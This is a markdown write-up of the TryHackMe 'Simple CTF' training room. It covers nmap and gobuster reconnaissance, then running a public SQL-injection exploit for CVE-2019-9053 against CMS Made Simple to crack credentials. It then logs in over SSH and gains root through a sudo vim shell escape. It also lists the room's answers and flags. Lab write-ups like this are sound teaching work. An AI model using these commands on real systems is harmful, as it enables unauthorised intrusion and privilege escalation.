# Try Hack Me Writeup - Simple CTF

- Tryhackme Room : <https://tryhackme.com/room/easyctf>


![alt text]( images/simple-ctf-logo.png "simple ctf room Image")


Write-up and walkthrough of the TryHackMe ‘Simple CTF’ room, including step-by-step exploitation process with screenshots.

#Tools Used
- `nmap`
- `gobuster`
- `searchsploit`

## 1. How many services are running under port 1000?

To find ports below 1000 we can use - `nmap -p 1-1000 TARGET-IP`

![alt text]( images/q-1-1.png "Q1 Image")

We can see here is 2 ports are running under port 1000

```commandline
2
```

## 2. What is running on the higher port?

To find that we can perform simple nmap scans 
- `nmap TARGET-IP`
- `nmap -sV -p 1-2222 TARGET-IP`

![alt text]( images/q-2-2.png "Q 2 Image" )

We can see ssh are running 

```commandline
SSH
```

## 3. What's the CVE you're using against the application?

I discovered a hidden directory with - `gobuster`
- `gobuster dir -u http://10.201.44.135/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10`

![alt text]( images/q-3-3.png "Q 3 Image" )

You can see in image that i found a hidden dircetory - `/simple`
then i visit this url  -`TARGET-IP/simple`

![alt text]( images/q-3-4.png "Q 3 Image" )

You can see that i found in the buttom - `CMS Made Simple version 2.2.8` then i simply search it on google

![alt text]( images/q-3-5.png "Q 3 Image" )

```commandline
CVE-2019-9053
```

## 4. To what kind of vulnerability is the application vulnerable?

We can see in exploit.db page on top that it can vulnerable with - `sql injection`

```commandline
SQLI
```

## 5. What's the password?

You can see in exploit.db we have EDB-ID - `46635`
now we have to save this exploit in over attacker machine to save this use this command - `searchsploit -m 46635`

![alt text]( images/q-5-6.png "Q 3 Image" )

after that you have to run that exploit with below's command
- `python2 46635.py -u TARGET-IP/simple/ --crack -w /usr/share/wordlists/rockyou.txt`

![alt text]( images/q-5-7.png "Q 3 Image" )

After running that command it take's time to find username, password and email (its take 2/3 minutes) 

```commandline
secret
```

## 6. Where can you login with the details obtained?

now you have user name and password use it for SSH
- `ssh mitch@TARGET-IP`
Enter the password - `secret`

```commandline
SSh
```

## 7. What's the user flag?

you can find a file - `user.txt` open it with - `cat` 

```commandline
G00d j0b, keep up!
```

## 8. Is there any other user in the home directory? What's its name?

To find other user go to home directory - `cd /home`
Then you can see other user 

```commandline
sunbath
```

## 9. What can you leverage to spawn a privileged shell?

we can use vim to privilage shell i found this command on 'https://gtfobins.github.io/gtfobins/vim/'
- `sudo vim -c ':!/bin/sh'`

![alt text]( images/q-9-9.png "Q 3 Image" )

```commandline
vim
```

## 10. What's the root flag?

I discovered that user mitch can run /usr/bin/vim as root without a password (- `sudo -l showed NOPASSWD: /usr/bin/vim`). I abused this by spawning a root shell with - `sudo vim -c ':!/bin/sh'`, which dropped me to a root shell (uid=0). From there I changed to /root and read the flag file: -`cat /root/root.txt`

![alt text]( images/q-10-10.png "Q 3 Image" )

```commandline
W3ll d0n3. You made it!
```

## Conclusion

This writeup documents the full exploitation of the TryHackMe "Simple CTF" room . I discovered a CMS Made Simple instance (v2.2.8) and used CVE-2019-9053 to recover credentials, logged in via SSH, and escalated to root by abusing a sudo Vim configuration to read both user and root flags.

Artifacts (screenshots, commands) are included in the repository under `/images`. This work is for educational purposes only — thanks to TryHackMe and the authors of the public exploits used.
